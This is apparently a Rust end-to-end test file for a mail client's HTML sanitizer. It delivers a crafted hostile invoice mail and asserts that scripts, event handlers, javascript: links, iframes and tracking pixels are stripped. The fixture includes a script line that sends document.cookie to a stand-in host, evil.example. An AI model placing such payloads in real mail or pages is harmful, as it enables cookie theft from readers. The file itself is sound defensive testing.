//! `sealbox read` on HTML mail (`docs/HTML_MAIL.md`) and the R4 signer-vs-sender warning
//! (`docs/THREAT_MODEL.md`), end to end against GreenMail: a hostile HTML mail is delivered to
//! u71 and read back through the real binary, which must show the sanitized markup and never
//! the HTML as it arrived.
//!
//! The mail is crafted here and put into the mailbox with IMAP `APPEND` (the CLI's `send` has
//! no HTML body option, and APPEND needs no SMTP round trip): u72 is the sender address in the
//! headers, u71 the mailbox that receives it. The inline-image case goes the whole way instead:
//! u72 submits a `multipart/related` mail over SMTP and u71 syncs it.
//!
//! Needs `testing/mail_up.sh`. Run with
//! `cargo test -p sealbox-cli --test cli_read_html -- --ignored`.

mod common;

use std::time::Duration;

use common::{imap_login, nonce, Profile};
use sealbox_mail::smtp::SmtpClient;
use sealbox_mail::{Auth, Security};

const RECEIVER: &str = "u71";
const SENDER: &str = "u72";

/// The hostile parts every case carries: script, event handler, CSS, a remote image, a tracking
/// pixel, an inline `cid:` image, a `javascript:` link and a real link.
fn hostile_html() -> String {
    "<html><head><style>p{color:red}</style></head><body>\
     <h1>Invoice</h1>\
     <p onclick=\"steal()\">Dear <b>customer</b>, your \
     <a href=\"https://shop.example/invoice?id=7&amp;v=2\" target=\"_blank\">invoice</a> is ready. \
     <a href=\"javascript:alert(1)\">Click here</a>.</p>\
     <script>fetch('https://evil.example/'+document.cookie)</script>\
     <iframe src=\"https://evil.example/\"></iframe>\
     <img src=\"https://cdn.example/banner.png\" alt=\"Banner\" width=\"600\">\
     <img src=\"https://track.example/open.gif\" width=\"1\" height=\"1\">\
     <img src=\"cid:logo@shop.example\" alt=\"Logo\">\
     <div style=\"display:none\">hidden pre-header</div>\
     </body></html>"
        .to_string()
}

fn html_only_mail(subject: &str) -> Vec<u8> {
    format!(
        "From: Shop <{SENDER}@{domain}>\r\n\
         To: <{RECEIVER}@{domain}>\r\n\
         Subject: {subject}\r\n\
         Date: Wed, 29 Oct 2026 09:00:00 +0000\r\n\
         Message-ID: <{subject}@{domain}>\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         \r\n\
         {}\r\n",
        hostile_html(),
        domain = common::DOMAIN
    )
    .into_bytes()
}

fn alternative_mail(subject: &str, text: &str) -> Vec<u8> {
    format!(
        "From: Shop <{SENDER}@{domain}>\r\n\
         To: <{RECEIVER}@{domain}>\r\n\
         Subject: {subject}\r\n\
         Date: Wed, 29 Oct 2026 09:05:00 +0000\r\n\
         Message-ID: <{subject}@{domain}>\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: multipart/alternative; boundary=\"b1\"\r\n\
         \r\n\
         --b1\r\n\
         Content-Type: text/plain; charset=utf-8\r\n\
         \r\n\
         {text}\r\n\
         --b1\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         \r\n\
         {}\r\n\
         --b1--\r\n",
        hostile_html(),
        domain = common::DOMAIN
    )
    .into_bytes()
}

/// A 2×2 PNG — the inline image — and the base64 it travels as.
const LOGO_PNG: [u8; 76] = [
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x08, 0x02, 0x00, 0x00, 0x00, 0xfd, 0xd4, 0x9a,
    0x73, 0x00, 0x00, 0x00, 0x13, 0x49, 0x44, 0x41, 0x54, 0x78, 0xda, 0x63, 0x90, 0x8b, 0x5a, 0xf1,
    0x75, 0x99, 0x32, 0x03, 0x10, 0x03, 0x59, 0x00, 0x28, 0xc2, 0x05, 0xbd, 0xf9, 0x0a, 0x7a, 0xc3,
    0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82,
];
const LOGO_PNG_BASE64: &str =
    "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAE0lEQVR42mOQi1rxdZkyAxADWQAowgW9+Qp6wwAAAABJRU5ErkJggg==";

/// `multipart/related`: an HTML part showing `cid:logo@x` (and naming a part the mail does not
/// carry), then the image/png part with `Content-ID: <logo@x>`.
fn related_mail(subject: &str) -> Vec<u8> {
    format!(
        "From: Shop <{SENDER}@{domain}>\r\n\
         To: <{RECEIVER}@{domain}>\r\n\
         Subject: {subject}\r\n\
         Date: Wed, 29 Oct 2026 09:10:00 +0000\r\n\
         Message-ID: <{subject}@{domain}>\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: multipart/related; boundary=\"rel\"; type=\"text/html\"\r\n\
         \r\n\
         --rel\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         \r\n\
         <html><body><h1>Receipt</h1><p><img src=\"cid:logo@x\" alt=\"Logo\"></p>\
         <p><img src=\"cid:missing@x\" alt=\"Gone\"></p></body></html>\r\n\
         --rel\r\n\
         Content-Type: image/png; name=\"logo.png\"\r\n\
         Content-Transfer-Encoding: base64\r\n\
         Content-ID: <logo@x>\r\n\
         Content-Disposition: inline; filename=\"logo.png\"\r\n\
         \r\n\
         {LOGO_PNG_BASE64}\r\n\
         --rel--\r\n",
        domain = common::DOMAIN
    )
    .into_bytes()
}

/// Submit `raw` over SMTP as u72, to u71.
async fn smtp_submit(raw: &[u8]) {
    let client = SmtpClient::connect_with_timeout(
        "127.0.0.1",
        3025,
        Security::Plain,
        Some(Auth::Password {
            user: SENDER.into(),
            pass: format!("{SENDER}pw"),
        }),
        Duration::from_secs(30),
    )
    .expect("smtp connect");
    client
        .send_raw(
            &format!("{SENDER}@{}", common::DOMAIN),
            &[format!("{RECEIVER}@{}", common::DOMAIN)],
            raw,
        )
        .await
        .expect("smtp submit");
    client.shutdown().await;
}

async fn deliver(raw: &[u8]) {
    let mut imap = imap_login(RECEIVER).await;
    imap.append("INBOX", raw, &[]).await.expect("APPEND");
    let _ = imap.logout().await;
}

/// Everything about one HTML-only mail: the default text view, `--html`, `--load-images`,
/// `--json` and `--raw`. One delivery, one sync — the assertions are independent.
#[tokio::test]
#[ignore = "needs GreenMail (testing/mail_up.sh)"]
async fn read_shows_sanitized_html_and_blocks_remote_images() {
    let p = Profile::new("readhtml");
    p.add_greenmail_account(RECEIVER);
    let subject = nonce("html-only");
    deliver(&html_only_mail(&subject)).await;
    p.sync(&format!("{RECEIVER}@{}", common::DOMAIN));
    let id = p.find_by_subject(None, "INBOX", &subject)["id"].to_string();

    // --- the default view: no text part, so the sanitized HTML as text ---
    let text_view = p.ok(&["read", &id, "--no-mark"]);
    assert!(text_view.contains("[HTML only"), "{text_view}");
    assert!(
        text_view.contains("[1 remote image blocked"),
        "the blocked count is reported: {text_view}"
    );
    assert!(text_view.contains("Invoice"), "{text_view}");
    assert!(
        text_view.contains("invoice <https://shop.example/invoice?id=7&v=2>"),
        "a link's target is shown: {text_view}"
    );
    assert!(
        text_view.contains("[Logo]"),
        "the cid image's alt: {text_view}"
    );
    for gone in [
        "<script",
        "fetch(",
        "onclick",
        "javascript:",
        "hidden pre-header",
        "<iframe",
    ] {
        assert!(
            !text_view.contains(gone),
            "{gone:?} survived in {text_view}"
        );
    }

    // --- --html: the sanitized markup ---
    let html = p.ok(&["read", &id, "--no-mark", "--html"]);
    assert!(html.contains("<h1>Invoice</h1>"), "{html}");
    assert!(
        html.contains(
            "<a href=\"https://shop.example/invoice?id=7&amp;v=2\" rel=\"noopener noreferrer nofollow\">invoice</a>"
        ),
        "the link keeps its target, gains rel, loses target=_blank: {html}"
    );
    assert!(
        html.contains("<img src=\"cid:logo@shop.example\" alt=\"Logo\">"),
        "the inline image survives: {html}"
    );
    assert!(
        html.contains(
            "<span class=\"sealbox-blocked-image\" data-src=\"https://cdn.example/banner.png\"></span>"
        ),
        "the remote image became a placeholder: {html}"
    );
    for gone in [
        "<script",
        "fetch(",
        "onclick",
        "javascript:",
        "<iframe",
        "<style",
        "style=",
        "target=",
        "track.example",
        "hidden pre-header",
        "<b>customer</b></p>",
    ] {
        assert!(
            !gone.is_empty() && !html.contains(gone),
            "{gone:?} survived in {html}"
        );
    }
    assert!(
        !html.contains("<img src=\"http"),
        "no remote image is rendered while blocked: {html}"
    );

    // --- --load-images: the same mail with the remote URL kept ---
    let loaded = p.ok(&["read", &id, "--no-mark", "--html", "--load-images"]);
    assert!(
        loaded
            .contains("<img src=\"https://cdn.example/banner.png\" alt=\"Banner\" width=\"600\">"),
        "{loaded}"
    );
    assert!(!loaded.contains("sealbox-blocked-image"), "{loaded}");
    assert!(
        !loaded.contains("track.example"),
        "a 1×1 tracking pixel is never loaded: {loaded}"
    );

    // --- --json: the sanitized body is a field of its own; the raw HTML is untouched ---
    let v = p.json(&["read", &id, "--no-mark"]);
    assert_eq!(v["html_body"]["remote_images"], 1);
    let safe = v["html_body"]["html"].as_str().expect("html_body.html");
    assert!(!safe.contains("<script"), "{safe}");
    assert!(safe.contains("sealbox-blocked-image"), "{safe}");
    assert!(
        v["html_body"]["text"]
            .as_str()
            .is_some_and(|t| t.contains("Invoice")),
        "{v}"
    );
    // The markup as it arrived is still stored — in `html`, or (for an HTML-only mail, which
    // mail-parser reports as a text body) in `text`. Either way a UI must use `html_body`.
    let stored = format!("{}{}", v["html"], v["text"]);
    assert!(
        stored.contains("<script>") && stored.contains("onclick"),
        "the mail as it arrived is kept somewhere: {v}"
    );
    assert_eq!(
        v["signer_mismatch"],
        serde_json::Value::Null,
        "unsigned mail"
    );

    // --- --raw still prints the message as fetched ---
    let raw = p.ok(&["read", &id, "--no-mark", "--raw"]);
    assert!(raw.contains("Content-Type: text/html"), "{raw}");
    assert!(raw.contains("<script>"), "--raw is the bytes as fetched");
}

/// With a text part, the default view is that text (not the HTML), while `--html` still shows
/// the sanitized markup.
#[tokio::test]
#[ignore = "needs GreenMail (testing/mail_up.sh)"]
async fn a_text_part_is_preferred_for_the_text_view() {
    let p = Profile::new("readhtml-alt");
    p.add_greenmail_account(RECEIVER);
    let subject = nonce("alternative");
    let text = format!("plain part of {subject}");
    deliver(&alternative_mail(&subject, &text)).await;
    p.sync(&format!("{RECEIVER}@{}", common::DOMAIN));
    let id = p.find_by_subject(None, "INBOX", &subject)["id"].to_string();

    let view = p.ok(&["read", &id, "--no-mark"]);
    assert!(view.contains(&text), "{view}");
    assert!(!view.contains("[HTML only"), "{view}");
    assert!(
        !view.contains("<h1>"),
        "the text view never prints markup: {view}"
    );

    let html = p.ok(&["read", &id, "--no-mark", "--html"]);
    assert!(html.contains("<h1>Invoice</h1>"), "{html}");
    assert!(!html.contains("<script"), "{html}");

    let v = p.json(&["read", &id, "--no-mark"]);
    assert_eq!(v["text"].as_str().map(str::trim), Some(text.as_str()));
    assert_eq!(v["html_body"]["remote_images"], 1);
}

/// A mail whose HTML part has nothing showable (one tracking pixel) has no HTML body at all,
/// and `--html` says so instead of printing an empty document.
#[tokio::test]
#[ignore = "needs GreenMail (testing/mail_up.sh)"]
async fn a_body_with_nothing_to_show_has_no_html_body() {
    let p = Profile::new("readhtml-pixel");
    p.add_greenmail_account(RECEIVER);
    let subject = nonce("pixel-only");
    let raw = format!(
        "From: Shop <{SENDER}@{domain}>\r\n\
         To: <{RECEIVER}@{domain}>\r\n\
         Subject: {subject}\r\n\
         Message-ID: <{subject}@{domain}>\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         \r\n\
         <img src=\"https://track.example/o.gif\" width=\"1\" height=\"1\">\r\n",
        domain = common::DOMAIN
    );
    deliver(raw.as_bytes()).await;
    p.sync(&format!("{RECEIVER}@{}", common::DOMAIN));
    let id = p.find_by_subject(None, "INBOX", &subject)["id"].to_string();

    let html = p.ok(&["read", &id, "--no-mark", "--html"]);
    assert!(html.contains("(no HTML part)"), "{html}");
    // and the default view does not print the markup either
    let view = p.ok(&["read", &id, "--no-mark"]);
    assert!(view.contains("(empty body)"), "{view}");
    assert!(
        !view.contains("<img"),
        "markup must never be printed raw: {view}"
    );
    let v = p.json(&["read", &id, "--no-mark"]);
    assert_eq!(v["html_body"], serde_json::Value::Null);
    assert!(
        format!("{}{}", v["html"], v["text"]).contains("track.example"),
        "the mail as it arrived is still stored: {v}"
    );
}

/// An inline image (`multipart/related`, `Content-ID: <logo@x>`) sent over SMTP and synced:
/// `--html` keeps the `cid:` URL and names the part it shows (and says when no part carries a
/// cid), the attachment list and `--json` carry the Content-ID, and the part's bytes are the
/// image's.
#[tokio::test]
#[ignore = "needs GreenMail (testing/mail_up.sh)"]
async fn an_inline_image_names_the_part_it_shows() {
    let p = Profile::new("readhtml-cid");
    p.add_greenmail_account(RECEIVER);
    let subject = nonce("inline-image");
    smtp_submit(&related_mail(&subject)).await;
    let email = format!("{RECEIVER}@{}", common::DOMAIN);
    let mut id = None;
    for _ in 0..20 {
        p.sync(&email);
        id = p
            .list(None, "INBOX")
            .into_iter()
            .find(|m| m["subject"].as_str() == Some(subject.as_str()))
            .map(|m| m["id"].to_string());
        if id.is_some() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
    let id = id.expect("the SMTP mail reached u71's INBOX");

    let html = p.ok(&["read", &id, "--no-mark", "--html"]);
    assert!(html.contains("<h1>Receipt</h1>"), "{html}");
    assert!(
        html.contains("<img src=\"cid:logo@x\" alt=\"Logo\">"),
        "the cid: URL is kept: {html}"
    );
    let named = format!(
        "inline image: cid:logo@x → attachment 0 (logo.png, image/png, {} bytes)",
        LOGO_PNG.len()
    );
    assert!(html.contains(&named), "{named:?} missing from {html}");
    assert!(
        html.contains("inline image: cid:missing@x → no part of this message has that Content-ID"),
        "an unresolved cid is reported: {html}"
    );
    for line in html.lines().filter(|l| l.starts_with("inline image:")) {
        println!("e2e: {line}");
    }

    // The default view lists the part like any attachment and no inline-image lines.
    let view = p.ok(&["read", &id, "--no-mark"]);
    assert!(
        view.contains(&format!(
            "[0] logo.png (image/png, {} bytes)",
            LOGO_PNG.len()
        )),
        "{view}"
    );
    assert!(!view.contains("inline image:"), "{view}");

    // --json: the Content-ID per attachment, next to the sanitized body that names it.
    let v = p.json(&["read", &id, "--no-mark"]);
    assert_eq!(v["attachments"][0]["content_id"], "logo@x", "{v}");
    assert_eq!(v["attachments"][0]["filename"], "logo.png", "{v}");
    assert_eq!(v["attachments"][0]["content_type"], "image/png", "{v}");
    assert_eq!(v["attachments"][0]["size"], LOGO_PNG.len(), "{v}");
    assert!(
        v["html_body"]["html"]
            .as_str()
            .is_some_and(|h| h.contains("<img src=\"cid:logo@x\" alt=\"Logo\">")),
        "{v}"
    );

    // The bytes behind the cid are the image.
    let out = p.dir.path().join("logo-out.png");
    p.ok(&[
        "attachment",
        "save",
        &id,
        "0",
        out.to_str().expect("utf-8 path"),
    ]);
    assert_eq!(std::fs::read(&out).expect("saved"), LOGO_PNG);
}
